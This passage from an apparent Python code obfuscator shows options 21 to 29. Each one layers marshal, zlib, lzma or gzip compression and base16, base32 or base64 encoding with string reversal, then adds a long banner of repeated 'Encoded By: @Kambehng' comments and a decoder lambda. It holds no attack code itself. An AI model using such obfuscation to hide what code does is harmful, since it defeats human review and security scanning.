Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
    elif option == 21:
        xx = "b32(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
    elif option == 22:
        xx = "b64(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
    elif option == 23:
        xx = "b16(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 24:
        xx = "b32(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 25:
        xx = "b64(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 26:
        xx = "b16(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 27:
        xx = "b32(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 28:
        xx = "b64(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 29:
        xx = "b16(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: 